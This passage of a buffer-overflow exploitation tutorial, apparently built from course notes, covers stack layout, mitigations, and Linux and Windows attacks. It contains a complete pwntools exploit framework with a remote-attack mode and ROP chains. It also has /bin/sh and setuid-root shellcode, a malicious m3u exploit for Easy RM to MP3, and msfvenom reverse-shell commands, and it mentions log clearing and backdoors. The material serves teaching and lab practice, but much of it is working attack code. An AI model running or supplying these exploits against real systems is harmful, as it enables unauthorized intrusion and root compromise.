    """Auto-measure offset from crash core by running the binary."""
    context.arch = "i386"
    elf = ELF(binary, checksec=False)
    p = process(binary)
    p.sendline(cyclic(pattern_size))
    p.wait(timeout=timeout)
    try:
        core = p.corefile
        return cyclic_find(core.eip)
    except Exception:
        return None
```

### Shellcode (Linux x86)

Insert the execve("/bin/sh") shellcode into the exploit payload. This 23-byte null-free shellcode executes /bin/sh.

```python
# execve("/bin/sh", 0, 0) shellcode (23 bytes)
shellcode = (
    b"\x31\xc0"             # xor eax, eax
    b"\x50"                 # push eax (null terminator)
    b"\x68\x2f\x2f\x73\x68" # push "//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"
    b"\x89\xe3"             # mov ebx, esp
    b"\x50"                 # push eax
    b"\x53"                 # push ebx
    b"\x89\xe1"             # mov ecx, esp
    b"\x31\xd2"             # xor edx, edx
    b"\xb0\x0b"             # mov al, 0x0b (execve syscall)
    b"\xcd\x80"             # int 0x80
)
```

### Complete Exploit (NOP Sled + Shellcode)

After controlling EIP, insert the shellcode to execute into the buffer. Shellcode typically runs `/bin/sh` or establishes a reverse shell, and `msfvenom` can generate payloads for various platforms.

```python
#!/usr/bin/env python3
"""
pwntools-based BOF exploit framework — supports local/remote/GDB modes
Usage:
  python3 bof_exploit.py              # Local execution
  python3 bof_exploit.py --remote HOST PORT   # Remote attack
  python3 bof_exploit.py --gdb        # GDB debugging
  python3 bof_exploit.py --find-offset  # Auto-detect offset with cyclic pattern
"""
import argparse
import sys
from pathlib import Path

try:
    from pwn import (
        ELF, ROP, cyclic, cyclic_find, flat, log, p32, p64,
        process, remote, gdb, context, asm, shellcraft,
    )
except ImportError:
    sys.exit("[!] pwntools required: pip3 install pwntools")


# ── Target binary configuration ───────────────────────────────────────
BINARY = "./vuln"          # Target binary path
ARCH   = "i386"            # i386 or amd64
OS     = "linux"

context.arch = ARCH
context.os   = OS
context.log_level = "info"


def find_offset(binary_path: str, pattern_size: int = 300) -> int | None:
    """Auto-calculate EIP/RIP offset using cyclic pattern."""
    log.info(f"Detecting offset... (pattern size: {pattern_size})")
    pattern = cyclic(pattern_size)

    try:
        elf = ELF(binary_path, checksec=False)
        p = process(binary_path)
        p.sendline(pattern)
        p.wait()

        core = p.corefile
        if context.arch == "i386":
            crashed_eip = core.eip
            offset = cyclic_find(crashed_eip)
        else:
            crashed_rsp = core.read(core.rsp, 4)
            offset = cyclic_find(crashed_rsp)

        log.success(f"Offset found: {offset}")
        return offset
    except Exception as e:
        log.warning(f"Auto-detection failed: {e}  — manual GDB check required")
        return None


def build_payload(elf: ELF, offset: int, use_rop: bool = False) -> bytes:
    """
    Build payload:
    - NX disabled: NOP Sled + Shellcode
    - NX enabled:  ROP chain
    """
    if use_rop or bool(elf.nx):
        log.info("NX enabled — building ROP chain")
        rop = ROP(elf)

        # ret2libc pattern: call system("/bin/sh")
        try:
            system_addr = elf.plt.get("system") or elf.symbols["system"]
            binsh_addr  = next(elf.search(b"/bin/sh\x00"))
            ret_gadget  = rop.find_gadget(["ret"])[0]  # stack alignment

            if context.arch == "amd64":
                rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
                chain = flat(
                    b"A" * offset,
                    p64(ret_gadget),     # 16-byte stack alignment
                    p64(rdi_gadget),
                    p64(binsh_addr),
                    p64(system_addr),
                )
            else:
                chain = flat(
                    b"A" * offset,
                    p32(system_addr),
                    p32(0xdeadbeef),  # fake return address
                    p32(binsh_addr),
                )
            log.info(f"ROP chain built ({len(chain)} bytes)")
            return chain
        except Exception as e:
            log.warning(f"ROP build failed: {e}  — falling back to NOP Sled")

    # NOP Sled + Shellcode method
    log.info("Building NOP Sled + Shellcode payload")
    if context.arch == "amd64":
        shellcode = asm(shellcraft.amd64.linux.sh())
        packer = p64
    else:
        shellcode = asm(shellcraft.i386.linux.sh())
        packer = p32

    nop_sled = b"\x90" * 64

    # Return address: expected NOP Sled location in stack (verify with gdb)
    ret_addr = 0xbfff1090  # Adjust after confirming in gdb during practice

    padding = b"A" * (offset - len(nop_sled) - len(shellcode))
    payload = nop_sled + shellcode + padding + packer(ret_addr)

    log.info(f"Payload: {len(payload)} bytes  |  RET: {hex(ret_addr)}")
    return payload


def exploit(args: argparse.Namespace) -> None:
    binary_path = args.binary

    if not Path(binary_path).exists():
        sys.exit(f"[!] Binary not found: {binary_path}")

    elf = ELF(binary_path, checksec=True)
    context.binary = elf

    # Offset detection mode
    if args.find_offset:
        find_offset(binary_path, args.pattern_size)
        return

    offset = args.offset
    if offset is None:
        offset = find_offset(binary_path)
        if offset is None:
            offset = int(input("[?] Enter offset manually: "))

    payload = build_payload(elf, offset, use_rop=args.rop)

    # Select connection mode
    if args.remote:
        host, port = args.remote
        log.info(f"Remote connection: {host}:{port}")
        io = remote(host, int(port))
    elif args.gdb_mode:
        log.info("GDB debug mode")
        io = gdb.debug(binary_path, gdbscript="""
            break *vulnerable_function
            continue
        """)
    else:
        log.info(f"Local execution: {binary_path}")
        io = process(binary_path)

    try:
        log.info(f"Sending payload ({len(payload)} bytes)")
        io.sendlineafter(b":", payload) if args.prompt else io.sendline(payload)
        io.interactive()
    except EOFError:
        log.failure("Connection closed — crash occurred or wrong offset")
    finally:
        io.close()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="pwntools BOF exploit framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-b", "--binary", default=BINARY, help="Target binary")
    parser.add_argument("-o", "--offset", type=int, help="EIP/RIP offset (auto-detected if not specified)")
    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"), help="Remote attack mode")
    parser.add_argument("--gdb", dest="gdb_mode", action="store_true", help="GDB debugging mode")
    parser.add_argument("--find-offset", action="store_true", help="Only detect offset with cyclic")
    parser.add_argument("--pattern-size", type=int, default=300, help="Cyclic pattern size")
    parser.add_argument("--rop", action="store_true", help="Force ROP chain usage")
    parser.add_argument("--prompt", action="store_true", help="Wait for input prompt then send")
    args = parser.parse_args()
    exploit(args)


if __name__ == "__main__":
    main()
```

---

## 7. Privilege Escalation via setUID Bit

### setUID Concept

Files with the setUID bit set run with the file owner's permissions. If a root-owned setUID program is vulnerable, it can be exploited for privilege escalation.

```bash
# setUID: execute with owner (usually root) permissions
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root ... /usr/bin/passwd
#    ^-- s: setUID bit (runs as root)

# Find vulnerable setUID programs for root shell!
find / -perm -4000 -type f 2>/dev/null
```

### Attacking a Vulnerable setUID Program

Example of a setUID program with a buffer overflow vulnerability. Exploiting this program yields a root shell.

```c
// Vulnerable setUID program (./vuln_suid)
// Owner: root, setUID set
#include <stdio.h>
#include <string.h>

void copy(char *src) {
    char buf[32];
    strcpy(buf, src);  // Vulnerable!
}

int main(int argc, char **argv) {
    copy(argv[1]);
    return 0;
}
```

```python
# Exploit setUID program to get root shell
import struct

# Shellcode to get root shell (setuid(0) + execve /bin/sh)
shellcode = (
    b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"  # setuid(0)
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"       # execve(/bin/sh)
)

offset = 44  # buffer(32) + saved_ebp(4) + 8 (alignment)
ret_addr = struct.pack('<I', 0xbfff1234)

payload = b"\x90" * 16 + shellcode
payload += b"A" * (offset - len(payload))
payload += ret_addr

print(repr(payload))
```

---

## 8. Exploit Mitigations

### ASLR (Address Space Layout Randomization)

Check the ASLR status. When ASLR is enabled, the addresses of stack, heap, and libraries change with every execution, making exploitation harder.

```bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = partial
# 2 = full

# Disable ASLR (for practice)
echo 0 > /proc/sys/kernel/randomize_va_space

# ASLR bypass techniques:
# - Brute Force (32-bit address space is small)
# - Information Leak (exploit address leak vulnerability)
# - NOP Sled (increase hit probability)
```

### Stack Canary

Stack Canary is a protection mechanism that detects buffer overflows. If the canary value is modified before function return, it triggers a stack smashing error.

```bash
# Enabled by default in GCC
gcc -fstack-protector-all vuln.c -o vuln  # Enable
gcc -fno-stack-protector vuln.c -o vuln   # Disable (for practice)

# Behavior: inserts canary value at end of stack frame
# Verifies canary before function return; terminates program if modified
```

### DEP/NX (Data Execution Prevention / No-Execute)

DEP/NX prevents code execution from stack and heap memory. Bypassing this protection requires ROP (Return Oriented Programming).

```bash
# Non-executable stack (default)
gcc -z noexecstack vuln.c  # Enable NX
gcc -z execstack vuln.c    # Disable NX (for practice)

# NX bypass: ROP (Return Oriented Programming)
# → Reuse existing code fragments (gadgets) with execution permissions
```

### PIE (Position Independent Executable)

PIE combined with ASLR loads the binary itself at a random address. When PIE is enabled, the code base address must be leaked first.

```bash
# ASLR + PIE: binary itself loads at random address
gcc -pie -fPIE vuln.c  # Enable PIE
gcc -no-pie vuln.c     # Disable PIE

# Check
checksec --file=vuln   # tool included with pwntools
```

---

## 9. Windows Stack-Based BOF — Step-by-Step Attack

### 9-1. Trigger Crash (Fuzzing)

The first step in attacking a Windows application BOF is triggering a crash with large input.

```perl
# Generate malicious m3u file with Perl (Easy RM to MP3 example)
my $file = "crash.m3u";
my $junk = "\x41" x 30000;   # 30000 'A' characters
open($FILE, ">$file");
print $FILE "$junk";
close($FILE);
print "m3u File Created Successfully\n";
```

When EIP shows `41414141` ('AAAA') in WinDbg after crash, EIP control is possible.

### 9-2. Calculate EIP Offset (Metasploit Pattern)

Metasploit Framework is a vulnerability exploitation automation platform. Find the module with `search`, select with `use`, then specify target and payload with `set RHOSTS` and `set PAYLOAD` to execute the attack.

```bash
# Generate unique pattern with Metasploit pattern_create
./pattern_create.rb 5000

# Trigger crash with pattern, then check EIP value in WinDbg
# If EIP = 6A42376A, calculate with pattern_offset
./pattern_offset.rb 0x6a42376a 5000
# → 1072  (offset to EIP)
```

```python
# Same with pwntools
from pwn import *
pattern = cyclic(5000)
offset = cyclic_find(0x6a42376a)
print(offset)  # 1072
```

### 9-3. Confirm EIP Control

After finding the crash point with fuzzer, calculate the exact offset with MSF pattern. Generate a unique pattern with `msf-pattern_create`, send it, then analyze the EIP value with `msf-pattern_offset` to find the exact byte offset to EIP.

```perl
# Offset verification script
my $file = "eip_control.m3u";
my $junk = "\x41" x 26072;    # Padding before offset
my $eip  = "BBBB";             # EIP slot (verify with 42424242)
my $rest = "C" x 1000;         # Data after ESP
open($FILE, ">$file");
print $FILE $junk.$eip.$rest;
close($FILE);
```

Control confirmed when EIP = `42424242` and 'C' values appear in ESP in WinDbg.

### 9-4. Find JMP ESP Address

Jumping directly to memory addresses (like `0x000ff730`) fails due to null byte issues. Instead, use a DLL address containing the `JMP ESP` instruction.

```bash
# JMP ESP opcode: \xff\xe4
# Search within DLL range in WinDbg
s 01980000 l 019f1000 ff e4

# Search with findjmp tool
findjmp MSRMCcodec02.dll esp
# → 0x01BBF23A  jmp esp  (select address without null bytes)
```

Overwrite EIP with JMP ESP address to redirect execution flow to shellcode on the stack. Choose an address without null bytes.

```perl
# Overwrite EIP with JMP ESP address
my $eip = pack('V', 0x01bbf23a);  # little-endian packing
```

### 9-5. NOP Sled + Shellcode Insertion

NOP Sled is an array of NOP (0x90) instructions placed before shellcode. Even if the address is not exact, execution slides through NOPs to reach the shellcode, increasing reliability.

```perl
# Final exploit structure
my $file = "exploit.m3u";
my $junk      = "\x41" x 26072;
my $eip       = pack('V', 0x01bbf23a);  # JMP ESP address
my $nop_sled  = "\x90" x 25;            # NOP sled
my $shellcode = (                        # Shellcode generated with msfvenom
    "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
    "\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
    # ... (actual shellcode)
    "\x7f\xe8\x7b\xca"
);
open($FILE, ">$file");
print $FILE $junk.$eip.$nop_sled.$shellcode;
close($FILE);
```

### 9-6. Generate Shellcode with msfvenom

Generate shellcode for Windows with msfvenom. Use encoder options to remove null bytes and bypass AV detection.

```bash
# Windows x86 calculator shellcode
msfvenom -p windows/exec CMD=calc.exe -f perl

# Windows x86 reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -b "\x00\x0a\x0d" -f perl

# With encoder (bypass bad chars)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f c
```

---

## 10. Various Methods to Jump to Shellcode

Depending on register state at crash time, different jump techniques can be used.

### 10-1. CALL [register]

Used when ESP points directly to shellcode.

```bash
# Search for CALL ESP in kernel32.dll
findjmp kernel32.dll esp
# 0x7C8369F0  call esp
# 0x7C86467B  jmp esp
```

Overwrite EIP with JMP ESP address to redirect execution to shellcode on the stack. Choose addresses without null bytes.

```perl
my $eip = pack('V', 0x7c8369f0);  # CALL ESP address
my $extra = "XXXX";                # 4 extra bytes so ESP points to shellcode start
```

### 10-2. POP/RET — When shellcode is at ESP+offset

```
POP opcodes:
  pop eax → 0x58
  pop ebx → 0x5b
  pop ecx → 0x59
  pop edx → 0x5a
  pop esi → 0x5e
  pop ebp → 0x5d
  ret     → 0xc3

pop/pop/ret opcodes: 58 5d c3 (or other register combinations)
```

POP/POP/RET is used in SEH (Structured Exception Handler)-based exploits. Two POPs load the exception handler pointer, then RET jumps to it.

```perl
# Overwrite EIP with pop/pop/ret address
# Place JMP ESP address at ESP+8, followed by shellcode
my $eip   = pack('V', 0x01966a10);  # pop/pop/ret address
my $jmpesp = pack('V', 0x01bbf23a); # JMP ESP address (at ESP+8 position)

# Payload structure:
# [AAAA...] [pop/pop/ret addr] [XXXX] [NOP x8] [JMP ESP addr] [NOP] [Shellcode]
```

### 10-3. PUSH ESP + RET

The 'push esp; ret' gadget saves the ESP value on the stack then jumps to that address. Used when shellcode is located below ESP.

```bash
# 'push esp; ret' opcodes: 54 c3
# Search in DLL
findjmp MSRMCcodec00.dll esp
# → 0x019557F6  push esp / ret
```

Final exploit with EIP overwritten to 'push esp; ret' gadget address. Apply after precisely locating shellcode position.

```perl
my $eip = pack('V', 0x019557f6);  # push esp / ret address
```

### 10-4. JMP [ESP+offset]

JMP [ESP+offset] is a gadget that jumps to the address at ESP plus a constant offset. Used when shellcode is a fixed distance from ESP.

```bash
# JMP [ESP+8] opcodes: ff 64 24 08
# Check in WinDbg:
# a  (assemble mode)
# jmp [esp+8]
# u (unassemble to check opcodes)
```

### 10-5. Small Buffer Bypass — Insert Shellcode in Front Buffer

When there is insufficient ESP space after EIP, place shellcode in the large padding space before EIP and use jump code to reach it.

```perl
# Jump code to buffer at ESP+515 (ADD ESP repeatedly + JMP ESP)
my $jump_code =
    "\x83\xc4\x67" .  # add esp, 0x67
    "\x83\xc4\x67" .  # add esp, 0x67
    "\x83\xc4\x67" .  # add esp, 0x67
    "\x83\xc4\x67" .  # add esp, 0x67
    "\x83\xc4\x67" .  # add esp, 0x67
    "\xff\xe4";        # jmp esp

# Structure: [NOP+Shellcode+A...] [JMP_ESP_addr] [XXXX] [jump_code]
#                ↑ large buffer before EIP   ↑EIP      ↑ESP  ↑jump code
```

---

## 11. BOF Fundamentals — From Theory to Practice

### 11-1. Starting Point of Program Attacks

Key characteristics of programs targeted by buffer overflow attacks:

1. The program accepts input from users.
2. Program execution results vary based on input content.
3. Abnormally long strings cause abnormal program behavior.
4. `Segmentation fault` error = the program confessing its own error.

```c
// Vulnerable program example (PDF 01's test.c)
main()
{
    char name[20];
    printf("Please enter your name: ");
    gets(name);                          // Vulnerability point
    printf("Ah, your name is %s.\n", name);
}
// Run: Enter 100+ 'A' characters → Segmentation fault
```

### 11-2. Buffer Concept

**Buffer** = temporary memory storage for data moving from one place to another.

- Exists everywhere: CPU internals, hard disk, printer, network, programs
- In C language, **variables** are used as buffers

**Buffer Overflow** = when user input data exceeds buffer capacity and overflows. Invades adjacent memory regions causing program issues.

### 11-3. Using Buffers in C Language

**Variable Types and Sizes (32-bit basis)**:

| Type | Size | Min Value | Max Value |
|------|------|-----------|-----------|
| char | 1 byte | -128 | 127 |
| short int | 2 bytes | -32768 | 32767 |
| int | 4 bytes | -2147483648 | 2147483647 |
| long int | 4 bytes | -2147483648 | 2147483647 |
| unsigned char | 1 byte | 0 | 255 |
| unsigned short int | 2 bytes | 0 | 65535 |
| unsigned int | 4 bytes | 0 | 4294967295 (= 2^32-1) |

Array buffer declaration and usage in C. Buffer overflow vulnerabilities occur when input size is not validated.

```c
// Array variable buffer declaration (ex3.c ~ ex5.c)
char c[13] = {'H', 'a', 'c', 'k', 'e', 'r', 's', 'c', 'h', 'o', 'o', 'l', '\0'};
// Or more simply:
char c[13] = "Hackerschool";
// Or auto-calculate size:
char c[] = "Hackerschool";   // Same as char c[13]

// Check variable size with sizeof
int i = 77;
printf("size of i: %d\n", sizeof(i));  // → 4

// Check memory address with &(ampersand)
printf("memory address of i: 0x%x\n", &i);  // → 0xbfffe784 (varies by environment)
```

**Buffer size calculation**: `char name[20]` → 1 byte × 20 = **20-byte buffer**. Overflow occurs when input exceeds 20 bytes.

### 11-4. Understanding Variable Memory Addresses

A single variable has three pieces of information ("triple"):
1. **Memory address** (actual location of the variable)
2. **Allocated size** (in bytes)
3. **Stored value**

**Relationship between variable declaration order and memory address (on stack)**:

```
// Code (ex1.c)
int a = 1;   // Address: 0xbffffb44
int b = 2;   // Address: 0xbffffb40
int c = 3;   // Address: 0xbffffb3c
int d = 4;   // Address: 0xbffffb38

Memory layout (low address → high address):
d(4)  c(3)  b(2)  a(1)
0x38  0x3c  0x40  0x44
```

**Key rule**: Later-declared variables are assigned lower memory addresses.

**Mixed integer + array**:
```
// char b[20] = "hello"; int a = 1;
// b declared later → assigned lower address
b         a
0xbffffb30  0xbffffb44
20 bytes    4 bytes
```

**Password bypass vulnerability principle** (`real_quiz.c`):
```c
int auth = 0;       // Declared first → higher address
char passwd[20];    // Declared later → lower address (20 bytes just below auth)

gets(passwd);  // Exceeding passwd[20] overwrites auth!
if(strcmp(passwd, "password") == 0) auth = 1;
if(auth) printf("Authentication successful!\n");
```
→ Entering 21+ bytes into `passwd` corrupts the `auth` value, bypassing authentication without the password.

### 11-5. gets() Function Vulnerability Detail

How `gets()` function works:
- **Argument**: starting address of buffer to store input (`buffer` is same as `&buffer[0]`)
- **Termination condition**: until Enter (`\n`) is pressed
- **No size limit**: stores all values entered before Enter at the specified address

```
"Stores all values entered by the user before pressing Enter
 at the memory address given as argument."
```

Compiler warning message:
```
xxx: the `gets' function is dangerous and should not be used.
```

### 11-6. Function Call and Return Mechanism

**Problem with multiple function calls**: Hardcoding the return address in code causes infinite loops. Therefore, "the address of the next code to execute" is recorded in memory just before calling a function.

```
This "reference location (address) to use when returning" is called the "Return Address."
```

**Actual memory layout** (when get_area() is called):
```
[low address]
child function area(0xbfffee54) | ??? | ??? | arg x(0xbfffee60) | arg y(0xbfffee64) | ...parent variables
                                  ↑SFP  ↑RET
```

**Memory address rules (on function call)**:
- Child function locals < SFP < return address < child function arguments < parent function locals
- Function arguments are allocated from low address in declaration order (opposite of locals)

### 11-7. Return Address Manipulation — Core of the Attack

```
SFP              Return Address
[child area] [SFP value] [next code addr] [arg x] [arg y] [parent variables]
    ↑
    Buffer overflow here
    can overwrite the return address!
```

**Conclusion**: Overwriting the return address via buffer overflow allows jumping to any desired address after function return.

### 11-8. Viewing Memory with Hexdump — dumpcode.h Practice

**Linux hex inspection tools**:
- `xxd /bin/ls` → outputs binary as hexadecimal (high byte first)
- `hexdump /bin/ls` → opposite byte order from xxd

**Dumping memory with code**:
```c
// Basic hex dump (ex2.c)
int i;
char str[20] = "hackerschool!";
printf("0x%08x ", &str);        // Print address
for(i=0; i<sizeof(str); i++)
    printf("%02x ", str[i]);    // Print hex values
// Result: 0xbffffb30 68 61 63 6b 65 72 73 63 68 6f 6f 6c 21 00 ...
```

**Using dumpcode.h** (by ohhara):
```c
#include "dumpcode.h"

// Print 100 bytes starting from str variable
dumpcode((unsigned char *)&str, 100);
// Result format:
// 0xbffffb30  68 61 63 6b 65 72 73 63 68 6f 6f 6c 21 00 00 00   hackerschool!...
```

Copying `dumpcode()` to `/usr/include/` allows including it from any path.

### 11-9. Little Endian and Big Endian Detail

**Origin**: "Gulliver's Travels" (1726 by Jonathan Swift) egg-cracking debate → first used as computer term in Danny Cohen's paper.

**Big Endian advantages**:
- Faster comparison of two numbers (no need to compare rest if first byte is larger)
- Same as human reading order (left → right)

**Little Endian advantages**:
- Faster even/odd determination (only need first byte)
- Advantageous for pointer dereferencing (low byte comes first)
- Faster arithmetic operations

```
// Storing value 10 (0x0000000A) in an int variable:
dumpcode(&test, 4);
// Result: 0xbffffb44  0a 00 00 00  ← Little Endian (low byte first)
// Human reading order (Big Endian): 00 00 00 0a
```

**CPU Endianness**:
- Little Endian: Intel x86/x64, AMD, ARM (general)
- Big Endian: Motorola 68000, SPARC, Network standard (TCP/IP)
- Byte order conversion functions: `htons()`, `htonl()` (host to network)

### 11-10. Memory Value Modification Practice (Training Course)

**String variable modification (DOG → CAT)**:
```bash
# buffer[20] is followed by target[4] = "DOG"
# Fill 20 bytes then input CAT
$ ./ex1 AAAAAAAAAAAAAAAAAAAAACAT
# Result: AAAACAT → target = CAT
```

**Integer variable modification (1234 → 5678)**:
```bash
# Note: keyboard input is all treated as 'characters'
# Characters '5678' = 0x35 0x36 0x37 0x38 → 943142453 (wrong answer)

# Use perl to input numeric value directly (backtick approach)
# Decimal 5678 = Hex 0x162E
# Little Endian: \x2e\x16
$ ./ex2 AAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x2e\x16"'`
# Result: [*] AFTER : the value of target is 5678

# Hacker number 31337 = 0x7A69 → Little Endian: \x69\x7a
$ ./ex2 AAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x69\x7a"'`
```

**Return address modification**:
```bash
# Fill buffer[20] + SFP[4] = 24 bytes then input desired address
# Modify return address to 0x12345678
$ ./ex3 AAAAAAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x78\x56\x34\x12"'`
# → Segmentation fault (jumped to wrong address)

# Modify to 0xdeadbeef (hackers' favorite "dead beef")
$ ./ex3 AAAAAAAAAAAAAAAAAAAAAAAA`perl -e 'print "\xef\xbe\xad\xde"'`
```

**Key**: Input 4-byte hex in Little Endian reverse order. Segmentation fault confirms successful return address modification.

### 11-11. Complete Memory Map (32-bit Process)

**32-bit address range**: 0x00000000 ~ 0xFFFFFFFF (= 4GB)

**Virtual Memory Structure**:
```
Low Address (0x00000000)
┌─────────────────────┐
│  Unmapped region     │  0x00000000 ~ ~0x08040000
├─────────────────────┤
│  Code (Text)         │  Machine code location (e.g., 0x080483c8)
├─────────────────────┤
│  Data region         │
│  ├ Initialized data  │  Global/static vars (with initial values) (e.g., 0x08049478)
│  └ Uninitialized BSS │  Global/static vars (no initial values) (e.g., 0x08049568)
├─────────────────────┤
│  Heap                │  malloc() dynamic allocation (e.g., 0x08049588) → grows up
├─────────────────────┤
│      Empty space     │  Fills as heap grows
├─────────────────────┤
│  Shared Libraries    │  libc.so.6, etc. (e.g., 0x4006604c)
│                      │  → printf, scanf and all library functions
├─────────────────────┤
│      Empty space     │
├─────────────────────┤
│  Stack               │  Locals, return addresses, function args (e.g., 0xbffffb44)
│                      │  ← Grows toward lower addresses
├─────────────────────┤
│  Kernel              │  0xc0000000 ~ 0xFFFFFFFF (1GB)
└─────────────────────┘
High Address (0xFFFFFFFF)
```

**User space 3GB + Kernel space 1GB** = 4GB total virtual memory

**On kernel region access**: Segmentation fault (protected region)

**Memory region order from low address**:
Code → Initialized data → Uninitialized data (BSS) → Heap → (empty) → Shared libraries → (empty) → Stack → Kernel

**Checking each region address**:
```c
// 1. Code region
printf("0x%08x\n", &main);   // → 0x080483c8

// 2. Initialized data
int a = 10;  // Global variable (initialized)
printf("&a = 0x%08x\n", &a); // → 0x08049478

// 3. Uninitialized data
int a;       // Global variable (uninitialized)
printf("&a = 0x%08x\n", &a); // → 0x08049568

// 4. Heap
char *heap = (char *)malloc(100);
printf("heap = 0x%08x\n", heap); // → 0x08049588

// 5. Library (via dlopen/dlsym)
// printf() is at 0x4006604c

// 6. Stack (local variable)
int a;
printf("&a = 0x%08x\n", &a); // → 0xbffffb44
```

**Process**: A running program loaded into virtual memory. Each new process gets an independent 4GB virtual memory allocation.

### 11-12. Stack Region Deep Dive

**Stack characteristics (LIFO - Last In First Out)**:
- Last data in is the first data out
- PUSH: add data to stack (TOP address decreases)
- POP: remove data from stack (TOP address increases)

**TOP and BOTTOM**:
- **TOP (Stack Pointer)**: lowest memory address among currently stacked data. Reference for add/remove. Decreases on PUSH, increases on POP.
- **BOTTOM**: bottom of stack (highest address). Always corresponds to 0xc0000000 (kernel boundary).

**Why stack grows from high to low addresses**:
1. Never invades kernel region (high addresses)
2. Heap grows low→high, so they face each other, efficiently using memory space

**Three ways to draw the stack**:
1. Vertical (intuitive growth direction, top is TOP)
2. Vertical reverse (high address at top)
3. Horizontal (aligned with memory map, left is low address = TOP)

### 11-13. Actual Verification of Stack Values

**1. Local variable stack storage order**:
```c
int a = 1, b = 2, c = 3, d = 4;
dumpcode((unsigned char *)&d, 16);
// → 0xbffffb38  [04 00 00 00] [03 00 00 00] [02 00 00 00] [01 00 00 00]
// d(4) c(3) b(2) a(1) order from low → high address
```

**1-byte/2-byte variable stack storage**:
- Stack default unit = 4 bytes
- `char x = 7` (1 byte): remaining 3 bytes filled with **dummy (garbage) values**
- `short x = 7` (2 bytes): 2 bytes dummy
- Byte Ordering (Little Endian) only occurs for **2+ bytes**

```
// char x = 7; stack result:
[03 00 00 00] [eb 83 04 07] [02 00 00 00]
     c         dummy|x=07      b
// short x = 7; stack result:
[03 00 00 00] [eb 83 07 00] [02 00 00 00]
     c         dummy|x=0007    b   (Byte Ordering occurs)
```

**2. Return address stack verification**:
```c
// Stack dump when func() is called
// 0xbffffb28  [06 00 00 00] [05 00 00 00] [48 fb ff bf] [2f 86 04 08]
//              func's b      func's a      SFP(Saved     RET(return addr)
//                                         Frame Pointer)
```

**3. Function argument stack storage order**:
- Function arguments are stored on stack in **reverse** declaration order
- `func(arg1, arg2)` → arg2 is PUSHED first, then arg1

```c
// Stack when func(10, 20) is called:
// [func's b] [func's a] [SFP] [RET] [arg1=0a] [arg2=14] [main's d..a]
```

**Stack Frame**:
- Collection of local variables + SFP + return address + function arguments for one function
- Every function has its own stack frame
- LIFO function call order → perfectly matches stack data structure

**Complete stack frame structure (low → high address)**:
```
[child function locals] [SFP] [RET] [child function arguments] [parent function locals]
```

### 11-14. Queue — Comparison with Stack

| Characteristic | Stack | Queue |
|---------------|-------|-------|
| Processing | LIFO (Last In First Out) | FIFO (First In First Out) |
| Analogy | Coin tube, coal pile | Two-ended pipe, waiting in line |
| Use case | Function call/return | Keyboard input, printer spool |

### 11-15. Local/Remote Buffer Overflow and 5 Stages of Hacking

**5 Stages of Hacking**:

1. **Information Gathering**: Identify domain, IP, OS, running services. Search for vulnerabilities.
2. **Remote Attack**: Gain server access without an account.
   - Social engineering (password guessing)
   - Web hacking (SQL Injection, XSS, file upload)
   - System hacking (BOF, Format String, etc.)
   - → BOF used here = **Remote Buffer Overflow**
3. **Local Attack**: Escalate from regular user to root privileges.
   - SetUID bit file vulnerabilities, local service vulnerabilities, kernel vulnerabilities
   - → BOF used here = **Local Buffer Overflow**
4. **Clearing Traces**: Delete access logs (log files record client IP and received data)
5. **Installing Backdoor**: Secret passage for re-entry

### 11-16. SetUID Bit Detail

**Concept**: An attribute set on executable files. Files with this attribute **operate with the file owner's permissions during execution**.

**Why it's needed**: When regular users change their password, they need to access `/etc/passwd` and `/etc/shadow`, so `/bin/passwd` temporarily needs root permissions only during execution.

```bash
# Check SetUID
$ ls -al /usr/bin/passwd
-r-s--x--x    1 root     root        12244 Feb  8  2000 /usr/bin/passwd
#   ↑ 's' attribute = SetUID bit set (runs with owner root's permissions)

# Find SetUID files
$ find / -perm -4000 2>/dev/null        # Search SetUID files (suppress errors)
$ find / -perm -4000                    # Search SetUID files (with errors)
$ find / -perm -g+s 2>/dev/null        # Search SetGID files

# Set/unset SetUID
$ chmod u+s filename   # Set SetUID
$ chmod u-s filename   # Unset SetUID
$ chmod g+s filename   # Set SetGID
$ chmod g-s filename   # Unset SetGID
$ chmod ug+s filename  # Set both SetUID + SetGID
```

**SetUID + BOF combination = privilege escalation attack**:
- Normal SetUID: owner permissions only during program execution, limited functionality
- If SetUID file has BOF vulnerability: change execution flow to escape restrictions and execute arbitrary commands with root privileges

**Related permission concepts**:
- `euid` (effective UID): actual permissions held during file execution
- `chown root:root file`: change file owner and group to root
- `2>/dev/null`: discard standard error output to `/dev/null` (hide error messages)

---

## 12. Key Q&A Summary (BOF Fundamentals)

### Main Concept Answers

| Question | Answer |
|----------|--------|
| What is a Buffer? | Temporary storage space for data received from keyboard, etc. |
| What is Buffer Overflow? | When data input exceeds buffer size, the buffer overflows and invades adjacent memory |
| What is gets() function? | Standard input function that receives strings without checking string length |
| Role of Return Address? | Stores address for returning to previous function. Prevents infinite loops. |
| Meaning of stack LIFO? | Last In First Out |
| Meaning of queue FIFO? | First In First Out |
| What is Segmentation fault? | Return address modified to wrong value, unable to find correct memory segment |
| What is virtual memory? | 4GB virtual memory logically structured in 32-bit systems, mapped to physical memory |
| What is Swapping? | Temporarily saving unused memory pages to hard disk to free physical memory |
| What is a Stack Frame? | Stack bundle of one function unit: locals + SFP + return address + function arguments |
| What is ESP? | Extended Stack Pointer Register — register pointing to current stack TOP position |
| ASLR acronym? | Address Space Layout Randomization |
| DEP acronym? | Data Execution Prevention |
